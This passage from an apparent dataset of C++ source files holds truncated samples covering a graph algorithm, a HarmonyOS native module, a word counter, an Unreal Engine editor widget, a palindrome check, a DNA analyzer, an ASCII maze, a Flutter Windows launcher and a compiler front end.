(std::numeric_limits<Weight>::max)() : get(distance, source(e, g)) + get(weight, e);\n\n    put(distance, target(e, g), new_distance);\n    if (new_distance > max_)\n      put(color, target(e, g), Color::black());\n  }\n\n private:\n  DistanceMap& distance;\n  const WeightMap& weight;\n  ColorMap& color;\n  Weight max_;\n};\n\n// Generate source vertices for approximate BC\ntemplate <typename Graph, typename Buffer>\nvoid\ngenerate_sources(const Graph& g, Buffer sources, \n                 typename graph_traits<Graph>::vertices_size_type num_sources)\n{\n  typedef typename graph_traits<Graph>::vertex_descriptor vertex_descriptor;\n  typedef typename graph_traits<Graph>::vertices_size_type vertices_siz",
    "#include \"napi/native_api.h\"\n#include <dlfcn.h>\n#include \"hilog/log.h\"\n\n#define LOAD_FUNCTION(handle, func) \\\n    func = (typeof(func))dlsym(handle, #func); \\\n    if (!func) { \\\n        OH_LOG_Print(LOG_APP, LOG_INFO, LOG_DOMAIN, \"ClashNative\", \"Failed to load function: %{public}s \\n\", #func); \\\n        return nullptr; \\\n    }\ntypedef int (*coreTest_t)();\ncoreTest_t coreTest;\nstatic napi_value Add(napi_env env, napi_callback_info info)\n{\n    size_t argc = 2;\n    napi_value args[2] = {nullptr};\n\n    napi_get_cb_info(env, info, &argc, args , nullptr, nullptr);\n\n    napi_valuetype valuetype0;\n    napi_typeof(env, args[0], &valuetype0);\n\n    napi_valuetype valuetype1;\n    napi_typeof(env, args[1], &valuetype1);\n\n    double value0;\n    napi_get_value_double(env, args[0], &value0);\n\n    double value1;\n    napi_get_value_double(env, args[1], &value1);\n\n    napi_value sum;\n    napi_create_double(env,  coreTest(), &sum);\n\n    return sum;\n\n}\n\n\n\nEXTERN_C_START\nstatic napi_value Init(napi_env env, napi_value exports)\n{\n    void *handle = dlopen(\"gotest.so\", RTLD_LAZY);\n    const char* dlsym_error = dlerror();\n    if (!handle) {\n        OH_LOG_Print(LOG_APP, LOG_INFO, LOG_DOMAIN, \"ClashNative\", \"Failed to load library: %{public}s \\n\", dlsym_error);\n        return NULL;\n    }\n    LOAD_FUNCTION(handle, coreTest);\n   \n    napi_property_descriptor desc[] = {\n        { \"add\", nullptr, Add, nullptr, nullptr, nullptr, napi_default, nullptr }\n    };\n    napi_define_properties(env, exports, sizeof(desc) / sizeof(desc[0]), desc);\n    return exports;\n}\nEXTERN_C_END\n\nstatic napi_module demoModule = {\n    .nm_version = 1,\n    .nm_flags = 0,\n    .nm_filename = nullptr,\n    .nm_register_func = Init,\n    .nm_modname = \"entry\",\n    .nm_priv = ((void*)0),\n    .reserved = { 0 },\n};\n\nextern \"C\" __attribute__((constructor)) void RegisterEntryModule(void)\n{\n    napi_module_register(&demoModule);\n}\n",
    "#include \"p_input.hpp\"  // Inclui o cabe\u00e7alho que define a classe 'p_input', onde est\u00e3o as fun\u00e7\u00f5es e atributos relacionados \u00e0 entrada de dados.\n#include <iostream>     // Inclui a biblioteca para opera\u00e7\u00f5es de entrada e sa\u00edda.\n#include <cstring>      // Inclui a biblioteca para manipula\u00e7\u00e3o de strings C-style.\n#include <locale>       // Inclui a biblioteca para suporte a diferentes locais de idiomas.\n#include <map>         // Inclui a biblioteca para usar mapas (estrutura de dados que associa chaves a valores).\n#include <string>      // Inclui a biblioteca para usar strings da classe std::string.\n#include <fstream>     // Inclui a biblioteca para opera\u00e7\u00f5es com arquivos.\n#include <cwctype>     // Inclui a biblioteca para fun\u00e7\u00f5es de manipula\u00e7\u00e3o de caracteres wide (largos).\n#include <codecvt>     // Inclui a biblioteca para convers\u00f5es entre diferentes tipos de codifica\u00e7\u00e3o de texto.\n#include <vector>      // Inclui a biblioteca para usar vetores, que s\u00e3o listas din\u00e2micas.\n#include <algorithm>   // Inclui a biblioteca que fornece algoritmos como sort().\n\nnamespace inp { // Inicia um espa\u00e7o de nomes para evitar conflitos de nomes.\n\n    // Construtor da classe p_input, inicializa as vari\u00e1veis com valores padr\u00e3o.\n    p_input::p_input()\n        : modo_de_ordenacao{\"-ac\"}, formato_de_saida{\"-csv\"}, caracteres{0}, total_de_palavras{0}, palavras_distintas{0} {}\n\n    // M\u00e9todo para processar os argumentos da linha de comando.\n    void p_input::process_arg(int argc, char* argv[]) {\n        if (argc == 1) { // Se n\u00e3o houver argumentos al\u00e9m do nome do programa\n            std::cout << \"Informe um arquivo de texto para ser processado!\\n\";\n            std::cout << \"Op\u00e7\u00f5es permitidas:\\n\";\n            std::cout << \"-ac: Ordem alfab\u00e9tica crescente\\n\";\n            std::cout << \"-ad: Ordem alfab\u00e9tica decrescente\\n\";\n            std::cout << \"-nc: Ordem por n\u00famero de ocorr\u00eancias crescente\\n\";\n            std::cout << \"-nd: Ordem por n\u00famero de ocorr\u00eancias decrescente\\n\";\n            std::cout << \"-csv ou -html para definir o formato de sa\u00edda.\\n\";\n        } else {\n            // Processa cada argumento passado pelo usu\u00e1rio.\n            for (int i = 1; i < argc; ++i) {\n                // Verifica se o argumento \u00e9 um modo de ordena\u00e7\u00e3o\n                if (strcmp(argv[i], \"-ac\") == 0 || strcmp(argv[i], \"-ad\") == 0 ||\n                    strcmp(argv[i], \"-nc\") == 0 || strcmp(argv[i], \"-nd\") == 0) {\n                    modo_de_ordenacao = argv[i]; // Define o modo de ordena\u00e7\u00e3o baseado no argumento\n                } \n                // Verifica se o argumento \u00e9 um formato de sa\u00edda\n                else if (strcmp(argv[i], \"-html\") == 0 || strcmp(argv[i], \"-csv\") == 0) {\n                    formato_de_saida = argv[i]; // Define o formato de sa\u00edda baseado no argumento\n                } \n                // Assume que o argumento restante \u00e9 o nome do arquivo\n                else {\n                    nome_do_arquivo = argv[i];\n                }\n            }\n        }\n    }\n\n    // M\u00e9todo para processar o conte\u00fado do arquivo fornecido.\n    void p_input::process_input(const std::string& arquivo) {\n        std::wifstream wif(arquivo); // Cria um fluxo de entrada para ler o arquivo no formato wide.\n        if (!wif.is_open()) { // Verifica se o arquivo foi aberto com sucesso\n            std::cout << \"N\u00e3o foi poss\u00edvel abrir o arquivo de entrada.\" << std::endl;\n            return; // Se n\u00e3o abrir, encerra a fun\u00e7\u00e3o\n        }\n\n        auto Locale = std::locale(\"\"); // Define o local para suportar a leitura de caracteres especiais\n        wif.imbue(Locale); // Aplica o local ao fluxo de entrada\n\n        wchar_t ch; // Vari\u00e1vel para armazenar cada caractere lido\n        std::wstring palavra; // Vari\u00e1vel para construir palavras\n\n        // L\u00ea o arquivo caractere por caractere\n        while (wif.get(ch)) {\n            if (iswalpha(ch)) { // Se o caractere for uma letra\n                caracteres++; // Incrementa o contador de caracteres\n                palavra += std::towlower(ch); // Converte o caractere para min\u00fasculo e adiciona \u00e0 palavra\n            } else if (!palavra.empty()) { // Se encontrar um caractere que n\u00e3o \u00e9 uma letra e a palavra n\u00e3o estiver vazia\n                ocorrencias[palavra]++; // Incrementa a contagem da palavra no mapa de ocorr\u00eancias\n                total_de_palavras++; // Incrementa o total de palavras\n                palavra.clear(); // Limpa a palavra para construir uma nova\n            }\n        }\n\n        // Caso a \u00faltima palavra tenha sido lida, incrementa sua contagem\n        if (!palavra.empty()) {\n            ocorrencias[palavra]++;\n            total_de_palavras++;\n        }\n\n        palavras_distintas = ocorrencias.size(); // Armazena o n\u00famero de palavras distintas\n        wif.close(); // Fecha o arquivo\n\n        std::string nome_saida = \"saida\"; // Nome base do arquivo de sa\u00edda\n        // Exporta os dados no formato escolhido pelo usu\u00e1rio\n        if (formato_de_saida == \"-csv\") {\n            exportar_csv(nome_saida + \".csv",
    "\ufeff// Copyright CrystalVapor 2024, All rights reserved.\n\n\n#include \"Widget/CRRecoilUnitGraphEditor.h\"\n\n#include \"CRRecoilPattern.h\"\n#include \"CRRecoilPatternEditor.h\"\n#include \"CRRecoilPatternEditorCommands.h\"\n#include \"Fonts/FontMeasure.h\"\n#include \"Widget/CRRecoilUnitGraphBackgroundWidget.h\"\n#include \"Windows/WindowsPlatformApplicationMisc.h\"\n\nvoid SCRRecoilUnitGraphWidget::Construct(const FArguments& InArgs)\n{\n\tcheck(InArgs._RecoilPatternEditor)\n\tRecoilPatternEditor = InArgs._RecoilPatternEditor;\n\n\tRegisterCommands();\n\n\tconst FSlateFontInfo FontInfo = FCoreStyle::GetDefaultFontStyle(\"Regular\", 11);\n\n\tChildSlot\n\t[\n\t\tSNew(SOverlay)\n\t\t+SOverlay::Slot()\n\t\t.HAlign(HAlign_Fill)\n\t\t.VAlign(VAlign_Fill)\n\t\t[\n\t\t\tSAssignNew(BackgroundWidget, SCRRecoilUnitGraphBackgroundWidget)\n\t\t\t.Visibility(EVisibility::HitTestInvisible)\n\t\t]\n\t\t+SOverlay::Slot()\n\t\t.HAlign(HAlign_Right)\n\t\t.VAlign(VAlign_Bottom)\n\t\t[\n\t\t\tSNew(SOverlay)\n\t\t\t+SOverlay::Slot() // Editor Status Bar Background\n\t\t\t.HAlign(HAlign_Fill)\n\t\t\t.VAlign(VAlign_Fill)\n\t\t\t[\n\t\t\t\tSNew(SBorder)\n\t\t\t\t.BorderImage(FAppStyle::GetBrush(TEXT(\"Graph.TitleBackground\")))\n\t\t\t]\n\t\t\t+SOverlay::Slot() // \n\t\t\t.HAlign(HAlign_Fill)\n\t\t\t.VAlign(VAlign_Fill)\n\t\t\t.Padding(8.f)\n\t\t\t[\n\t\t\t\tSNew(SVerticalBox)\n\t\t\t\t+SVerticalBox::Slot()\n\t\t\t\t.AutoHeight()\n\t\t\t\t[\n\t\t\t\t\tSNew(STextBlock)\n\t\t\t\t\t.Text(FText::FromString(TEXT(\"This is a Status bar!\")))\n\t\t\t\t]\n\t\t\t]\n\t\t]\n\t];\n}\n\nvoid SCRRecoilUnitGraphWidget::SetObject(UCRRecoilUnitGraph* InRecoilUnitGraph)\n{\n\tRecoilUnitGraph = InRecoilUnitGraph;\n}\n\nvoid SCRRecoilUnitGraphWidget::SetViewPointToGraphOrigin()\n{\n\tBackgroundWidget->SetViewOffset(BackgroundWidget->GetTickSpaceGeometry().GetLocalSize()*-0.5f/BackgroundWidget->GetZoomAmount());\n}\n\nvoid SCRRecoilUnitGraphWidget::RegisterCommands()\n{\n\tconst FCRRecoilPatternEditorCommands& Commands = FCRRecoilPatternEditorCommands::Get();\n\tconst TSharedPtr<FUICommandList> CommandList = RecoilPatternEditor->GetToolkitCommands();\n\t\n}\n\nint32 SCRRecoilUnitGraphWidget::OnPaint(const FPaintArgs& Args, const FGeometry& AllottedGeometry,\n                                        const FSlateRect& MyCullingRect, FSlateWindowElementList& OutDrawElements, int32 LayerId,\n                                        const FWidgetStyle& InWidgetStyle, bool bParentEnabled) const\n{\n\n\t\n\tif(RecoilPatternEditor&&RecoilPatternEditor->bEnableAutoRearrangeUnits)\n\t{\n\t\tif(RecoilUnitGraph)\n\t\t{\n\t\t\tRecoilUnitGraph->RearrangeUnits();\n\t\t}\n\t}\n\n\tif(bNeedResetViewToOrigin)\n\t{\n\t\tconst_cast<SCRRecoilUnitGraphWidget&>(*this).SetViewPointToGraphOrigin();\n\t\tconst_cast<SCRRecoilUnitGraphWidget&>(*this).bNeedResetViewToOrigin = false;\n\t}\n\t\n\tSCompoundWidget::OnPaint(Args, AllottedGeometry, MyCullingRect, OutDrawElements, LayerId, InWidgetStyle,\n\t                                bParentEnabled);\n\tDrawOrigin(OutDrawElements, AllottedGeometry, LayerId);\n\tDrawRecoilUnits(OutDrawElements, AllottedGeometry, LayerId);\n\tDrawGridAxisNumbers(OutDrawElements, AllottedGeometry, LayerId);\n\tDrawSelectionBox(OutDrawElements, AllottedGeometry, LayerId);\n\treturn LayerId;\n}\n\nFReply SCRRecoilUnitGraphWidget::OnMouseButtonDown(const FGeometry& MyGeometry, const FPointerEvent& MouseEvent)\n{\n\tSelectionDrag.Reset();\n\n\tFVector2D MousePanelLocation = MyGeometry.AbsoluteToLocal(MouseEvent.GetScreenSpacePosition());\n\tif(MouseEvent.GetEffectingButton() == EKeys::RightMouseButton)\n\t{\n\t\tViewDrag = FCRUnitGraphViewDelayedDrag(\n\t\t\tMousePanelLocation,\n\t\t\tEKeys::RightMouseButton);\n\t}\n\tif(MouseEvent.GetEffectingButton() == EKeys::LeftMouseButton)\n\t{\n\t\tLastLeftMouseDownFoundUnitID = FindUnitByScreenLocation(MousePanelLocation, MyGeometry);\n\t\tFCRRecoilUnitSelection& CurrentRecoilUnitSelection = GetRecoilUnitSelection();\n\t\tif(LastLeftMouseDownFoundUnitID==INDEX_NONE)\n\t\t{\n\t\t\tCurrentRecoilUnitSelection.ClearSelection();\n\t\t\tSelectionDrag = FCRUnitGraphSelectionDelayedDrag(\n\t\t\t   MousePanelLocation,\n\t\t\t   EKeys::LeftMouseButton);\n\t\t\tMoveUnitsDrag.Reset();\n\t\t}else\n\t\t{\n\t\t\tif(!MouseEvent.IsControlDown()&&!CurrentRecoilUnitSelection.IsUnitSelected(LastLeftMouseDownFoundUnitID))\n\t\t\t{\n\t\t\t\tCurrentRecoilUnitSelection.ClearSelection();\n\t\t\t}\n\t\t\tCurrentRecoilUnitSelection.AddSelection(LastLeftMouseDownFoundUnitID);\n\t\t\tMoveUnitsDrag = FCRUnitGraphMoveUnitsDelayedDrag(\n\t\t\t\tGetUnitGraph(),\n\t\t\t\tCurrentRecoilUnitSelection,\n\t\t\t\tGraphCoordsToRecoilCoords(BackgroundWidget->PanelCoordToGraphCoord(MousePanelLocation)),\n\t\t\t\tMousePanelLocation,\n\t\t\t\tEKeys::LeftMouseButton);\n\t\t}\n\t}\n\treturn FReply::Handled();\n}\n\nFReply SCRRecoilUnitGraphWidget::OnMouseButtonUp(const FGeometry& MyGeometry, const FPointerEvent& MouseEvent)\n{\n\tif(MouseEvent.GetEffectingButton() == EKeys::RightMouseButton)\n\t{\n\t\tif(ViewDrag.IsSet()&&ViewDrag->IsDragging())\n\t\t{\n\t\t\tViewDrag.Reset();\n\t\t}\n\t}\n\telse if(MouseEvent.GetEffectingButton() == EKeys::LeftMouseButton)\n\t{\n\t\tbool bLeftMouseUpWithNoDrag = true;\n\t\tif(SelectionDrag.IsSet()&&SelectionDrag->IsDragging())\n\t\t{\n\t\t\tSelectionDrag.Reset();\n\t\t\tbLeftMouseUpWithNoDrag = false;\n\t\t}\n\t\tif(MoveUnitsDrag.IsSet()&&MoveUnitsDrag->IsDr",
    "class Solution {\r\nprivate :\r\n    bool Valid(char ch){\r\n        if((ch >= 'a' && ch <= 'z')|| (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch<='9')){\r\n            return 1;\r\n        }\r\n        \r\n            return 0;\r\n      \r\n    }\r\n    char toLowerCase(char ch){\r\n        if((ch >= 'a' && ch <= 'z') || (ch >= '0' && ch <= '9')){\r\n            return ch;\r\n        }\r\n        else{\r\n            char temp = ch -'A'+'a';\r\n            return temp;\r\n        }\r\n    }\r\n    bool chekPalindrome(string a){\r\n        int s = 0;\r\n        int e = a.length()-1;\r\n        while(s < e){\r\n            if(a[s] != a[e]){\r\n                return 0;\r\n            }\r\n            else{\r\n                s++;\r\n                e--;\r\n            }\r\n        }\r\n        return 1;\r\n    }\r\npublic:\r\n    bool isPalindrome(string s) {\r\n        string vish = \"\" ;\r\n        for(int i =0; i<s.length(); i++){\r\n            if( Valid(s[i])){\r\n                vish.push_back(s[i]);\r\n            }\r\n        }\r\n        for(int i=0; i <= vish.length(); i++){\r\n            vish[i] = toLowerCase(vish[i]);\r\n        }\r\n        return chekPalindrome(vish);\r\n\r\n        \r\n    }\r\n};",
    "#include \"DNAAnalyzer.h\"\n#include <iomanip>\n\n//we will be using 0,1,2,3 to represent A,C,G,T respectively\n///IS THERE A WAY TO ACCESS THESE WITHOUT CREATING A LIBRARY\nconst char DNAAnalyzer::BASE_LOOKUP[] = { 'A','C','G','T' };\n/**********************************************************************\nFunction:    DNAAnalyzer\n\nDescription: sets mcDNAStrandSet appropriately and calls analyze\n\t\t\t\t\t\t passing in a strand id for the consensus strand\n\nParameters:  rcDNAStrandSet - set to be analyzed\n\t\t\t\t\t\t rcID           - ID passed through function to be\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tassigned in calculateConsensus\n\nReturned:    none\n**********************************************************************/\nDNAAnalyzer::DNAAnalyzer (const DNAStrandSet &rcDNAStrandSet,\n\tconst string &rcID) {\n\tmcDNAStrandSet = rcDNAStrandSet;\n\tanalyze (rcID);\n}\n/**********************************************************************\nFunction:    DNAAnalyzer\n\nDescription: populates a DNAStrandSet by opening and reading the file\n\t\t\t\t\t\t from rcFileName then call analyze as in 6.\n\nParameters:  rcFileName - name of file that contains a strand set\n\t\t\t\t\t\t rcID       - ID passed through function to be\n\t\t\t\t\t\t\t\t\t\t\t\t\tassigned in calculateConsensus\n\nReturned:    none\n**********************************************************************/\nDNAAnalyzer::DNAAnalyzer (const string &rcFileName, const string &rcID)\n {//{ on new line not done by accident/ran out of space\n\tifstream inFile;\n\n\tinFile.open (rcFileName);\n\tif (inFile.fail ()) {\n\t\tcout << \"Error: Cannot Open File: \" << rcFileName << endl;\n\t\texit (EXIT_FAILURE);\n\t}\n\tif (static_cast<int>(mcDNAStrandSet.read (inFile)) <\n\t\tDNAStrand::FLAG::LEGAL) {\n\t\tcout << \"Error: ILLegal File Read: \" << rcFileName << endl;\n\t\texit (EXIT_FAILURE);\n\t}\n\tinFile.close ();\n\tanalyze (rcID);\n}\n/**********************************************************************\nFunction:    analyze\n\nDescription: needs to make sure all DNAStrands are of equal length, or\n\t\t\t\t\t\t an error is outputted to the display and the program is\n\t\t\t\t\t\t terminated. If the strands are of equal length, then call\n\t\t\t\t\t\t initProfile (), calculateProfile (), and\n\t\t\t\t\t\t calculateConsensus () which assigns the mcConsensusStrand\n\t\t\t\t\t\t to the consensus strand\n\nParameters:  rcID - ID passed through function to be assigned in\n\t\t\t\t\t\t calculateConsensus\n\nReturned:    none\n**********************************************************************/\nvoid DNAAnalyzer::analyze (const string &rcID) {\n\t//Check that the file is set is populated\n\tif (mcDNAStrandSet.size () <= 0) {\n\t\tcout << \"No DNA Strands To Process\" << endl;\n\t\texit (EXIT_FAILURE);\n\t}\n\t//Size of 1st strand to be checked against all other strands\n\tconst int STRAND_SIZE = mcDNAStrandSet.getStrand (0).size ();\n\t//iterate through strands(rows)\n\tfor (int strand = 0;\n\t\tstrand < static_cast<int>(mcDNAStrandSet.size ()); strand++) {\n\t\t//check that each strand matches in size\n\t\tif (STRAND_SIZE != mcDNAStrandSet.getStrand (strand).size ()) {\n\t\t\tcout << \"Error: Non-Homologous Strands\" << endl;\n\t\t\texit (EXIT_FAILURE);\n\t\t}\n\t}\n\tinitProfile ();\n\tcalculateProfile ();\n\tmcConsensusStrand = calculateConsensus (rcID);\n}\n/**********************************************************************\nFunction:    displayStrandSet\n\nDescription: display the strand set\n\nParameters:  rcOutStream - stream to output strand set\n\nReturned:    none\n**********************************************************************/\nvoid DNAAnalyzer::displayStrandSet (ostream &rcOutStream) const {\n\tmcDNAStrandSet.write (rcOutStream);\n\trcOutStream << endl;\n}\n/**********************************************************************\nFunction:    displayProfile\n\nDescription: Display the profile\n\nParameters:  rcOutStream - oStream used to write Profile\n\nReturned:    none\n**********************************************************************/\nvoid DNAAnalyzer::displayProfile (ostream &rcOutStream) const {\n\tfor (unsigned int base = 0; base < mcProfile.size (); base++) {\n\t\trcOutStream << BASE_LOOKUP[base];//start each row with base\n\t\tfor (unsigned int location = 0;\n\t\t\tlocation < mcProfile.at (base).size (); location++) {\n\t\t\trcOutStream << setw (3) << mcProfile.at (base).at (location);\n\t\t}\n\t\trcOutStream << endl;\n\t}\n\trcOutStream << endl;\n}\n/**********************************************************************\nFunction:    displayConsensus\n\nDescription: display the consensus strand\n\nParameters:  rcOutStream - Stream in which we write consensus strand\n\nReturned:    none\n**********************************************************************/\nvoid DNAAnalyzer::displayConsensus (ostream &rcOutStream) const {\n\tmcConsensusStrand.write (cout);\n}\n/**********************************************************************\nFunction:    getConsensusStrand\n\nDescription: single line function, returns mcConsensusStrand\n\nParameters:  none\n\nReturned:    mcConsensusStrand\n**********************************************************************/\nDNAStrand DNAAnalyzer::getConsensusStrand () const {\n\treturn mcConse",
    "#include <iostream>\r\nusing namespace std;\r\nmain() {\r\n\r\n\t\tcout<< \"  ######################################################################## \"<<endl;\r\n\t\tcout<< \"  ||.. .......................................................  ......  || \"<<endl;\r\n\t\tcout<< \"  ||.. %%%%%%%%%%%%%%%%%         ...     %%%%%%%%%%%%%%  |%|..   %%%%   || \"<<endl;\r\n\t\tcout<< \"  ||..         |%|   |%|      |%|...      |%|       |%|  |%|..    |%|   || \"<<endl;\r\n\t\tcout<< \"  ||..         |%|   |%|      |%|...      |%|       |%|  |%|..    |%|   || \"<<endl;\r\n\t\tcout<< \"  ||..         %%%%%%%% .  .  |%|...     %%%%%%%%%%%%%%          %%%%.  || \"<<endl;\r\n\t\tcout<< \"  ||..         |%|      .  .  |%|...    ............... |%| ..       .  || \"<<endl;\r\n\t\tcout<< \"  ||..         %%%%%%%%%.  .  |%|...    %%%%%%%%%%%     |%| ..   %%%%.  || \"<<endl;\r\n\t\tcout<< \"  ||..               |%|.               |%|......       |%| ..    |%|.  || \"<<endl;\r\n\t\tcout<< \"  ||..      ........ |%|.          P    |%|......|%|        ..    |%|.  || \"<<endl;\r\n\t\tcout<< \"  ||.. |%|  |%|%%%|%|.|%|.  |%|            ......|%|        ..|%| |%|.  || \"<<endl;\r\n\t\tcout<< \"  ||.. |%|  |%|   |%|..     %%%%%%%%%      ......|%|         .|%|.      || \"<<endl;\r\n\t\tcout<< \"  ||.. |%|  |%|   |%|..          ...|%|      %%%%%%%        . |%|.      || \"<<endl;\r\n\t\tcout<< \"  ||.. |%|            .          ...|%|                 |%| ..|%|.      || \"<<endl;\r\n\t\tcout<< \"  ||.. |%|  %%%%%%%%%%%%%        ...|%|%%%%%%%%%%%      |%| ..|%|%%%%%  || \"<<endl;\r\n\t\tcout<< \"  ||...............................................     |%| ..........  || \"<<endl;\r\n\t\tcout<< \"  ||  .............................................           ........  || \"<<endl;\r\n\t\tcout<< \"  ||.. |%|  |%|   |%|..     %%%%%%%%%%%    ......|%|    |%| ..|%|.      || \"<<endl;\r\n\t\tcout<< \"  ||.. |%|  |%|   |%|..          ...|%|        %%%%%%   |%| ..|%|.      || \"<<endl;\r\n\t\tcout<< \"  ||.. |%|            .    G     ...|%|                 |%| ..|%|.      || \"<<endl;\r\n\t\tcout<< \"  ||.. |%|  %%%%%%%%%%%          ...|%|%%%%%%%%%%%      |%| ..|%|%%%%%  || \"<<endl;\r\n\t\tcout<< \"  ||................................................    |%| ..........  || \"<<endl;\r\n\t\tcout<< \"  ||................................................            ......  || \"<<endl;\r\n\t\tcout<< \"  ######################################################################## \"<<endl;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"testflutterapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\n#include<unordered_map>\n#include<unordered_set>\n#include<fstream>\n#include<string>\n#include<iomanip>\n#include<algorithm>\n#include<vector>\n#include<windows.h>\n#include<stack>\nusing namespace std;\nconst int INF = 1e9 + 7;\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u6700\u5927\u6574\u6570\u503c\nconst int MAXN = 1e5 + 5;\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u7b26\u53f7\u8868\u8868\u9879\u7684\u6700\u5927\u503c\n\n\n/**************************************\u76f8\u5173\u8868\u9879\u3001\u9519\u8bef\u7ed3\u679c\u5b9a\u4e49****************************************/\nstruct Word {\n\tstring word_content;\t\t\t\t\t\t//\u5355\u8bcd\u5185\u5bb9\n\tstring word_type;\t\t\t\t\t\t\t//\u5355\u8bcd\u79cd\u7c7b\n\tint row;\t\t\t\t\t\t\t\t\t//\u5355\u8bcd\u6240\u5728\u884c\u6570\n\tWord() {}\n\tWord(string wc, int row, string wt) {\n\t\tword_content = wc;\n\t\tthis->row = row;\n\t\tword_type = wt;\n\t}\n\tvoid printWord() {\n\t\t//\u6253\u5370\u8bc6\u522b\u7684\u5355\u8bcd\u7ed3\u679c\n\t\tcout << setw(10) << left << word_content << \"     \" << setw(10) << word_type << \"       \" << row << endl;\n\t}\n\tbool operator==(const Word& word) {\n\t\treturn this->word_content == word.word_content;\n\t}\n};\nvector<Word>words;\t\t\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u5b58\u50a8\u8bcd\u6cd5\u5206\u6790\u5668\u7684\u7ed3\u679c\u6570\u7ec4\nstruct Error {\n\tstring error_content;\t\t\t\t\t\t//\u5b9a\u4e49\u9519\u8bef\u5185\u5bb9\n\tstring error_type;\t\t\t\t\t\t\t//\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\n\tint row;\t\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u9519\u8bef\u6240\u5728\u884c\u6570\n\tError(string ec, int row, string et) {\n\t\tthis->error_content = ec;\n\t\tthis->error_type = et;\n\t\tthis->row = row;\n\n\t}\n\tvoid print_error() {\n\t\tcout << \"Error Location in row[\" << this->row << \"]  \";\n\t\tcout << error_type << \" : \" << error_content << \"!\" << endl;\n\t}\n};\nvector<Error>errors;\t\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u5b58\u50a8\u9519\u8bef\u7684\u7ed3\u6784\u4f53\n\nstruct entry {\n\tstring name;\t\t\t\t\t\t\t//\u53d8\u91cf\u540d\n\tstring kind;\t\t\t\t\t\t\t//\u8be5\u9879\u7684\u79cd\u7c7b\n\tint level;\t\t\t\t\t\t\t\t//\u8be5\u9879\u6240\u5728\u5c42\u7684\u5927\u5c0f\n\tint offset;\t\t\t\t\t\t\t\t//\u8be5\u9879\u7684\u76f8\u5bf9\u5730\u5740(\u81ea\u52a8\u751f\u6210)\n\tint val;\t\t\t\t\t\t\t\t//\u82e5\u4e3a\u53d8\u91cf\u6216\u8005\u5e38\u91cf\uff0c\u9700\u8981\u8d4b\u503c\n\tint previous;\t\t\t\t\t\t\t//\u94fe\uff0c\u53ef\u4ee5\u901a\u8fc7\u6b64\u94fe\u53bb\u67e5\u627e\uff0c\u5982\u679c\u503c\u4e3a\u96f6\uff0c\u8868\u793a\u8be5\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u6307\u5b9a\u5185\u5bb9\uff08\u81ea\u52a8\u751f\u6210)\n\tint para_num;\t\t\t\t\t\t\t//\u8fc7\u7a0b\u540d\u5bf9\u5e94\u7684\u503c\uff0c\u8868\u793a\u8be5\u8fc7\u7a0b\u5bf9\u5e94\u7684\u53c2\u6570\u6570\u91cf\n\tentry() {}\n\tentry(string n, string k, int l, int o, int v, int p, int pa) {\n\t\tthis->name = n;\n\t\tthis->kind = k;\n\t\tthis->level = l;\n\t\tthis->offset = o;\n\t\tthis->val = v;\n\t\tthis->previous = p;\n\t\tthis->para_num = pa;\n\t}\n};\nvector<entry>entries(MAXN);\t\t\t\t\t\t\t\t//\u6808\u5f0f\u7b26\u53f7\u8868\t\nvector<int>entry_display;\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u5bf9\u5e94\u7684\u663e\u793a\u7b26\u53f7\u8868\n\nstruct code {\n\tstring op_name;\t\t\t\t\t//\u64cd\u4f5c\u540d\n\tint level;\t\t\t\t\t\t//\u5c42\u6570\n\tint op_num;\t\t\t\t\t\t//\u64cd\u4f5c\u6570\n\tcode() {}\n\tcode(string oname, int l, int onum) {\n\t\tthis->op_name = oname;\n\t\tthis->op_num = onum;\n\t\tthis->level = l;\n\t}\n\tvoid printCode(int width) {\n\t\tcout << setw(width) << left << this->op_name << setw(width) << left << this->level << setw(width) << left << this->op_num << endl;\n\t}\n};\nvector<code>codes;\t\t\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u4e09\u5730\u5740\u4ee3\u7801\n\nunordered_map<int, string>all_errors;\t\t\t\t\t//\u5b9a\u4e49\u9519\u8bef\u7684\u952e\u503c\u5bf9\u96c6\u5408\nunordered_map<int, string>all_errors_tp;\t\t\t\t//\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\u8868\n\nunordered_set <string>reserved;\t\t\t\t\t\t\t//\u5b9a\u4e49\u5173\u952e\u5b57\u7684\u96c6\u5408\nunordered_set <string>symbol;\t\t\t\t\t\t\t//\u5b9a\u4e49\u7b26\u53f7\u7684\u96c6\u5408\n\nvector<int>act_stack(MAXN);\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u6d3b\u52a8\u8bb0\u5f55\u6808\nstack<int>data_stack;\t\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u6570\u636e\u6808\n\nint act_top = 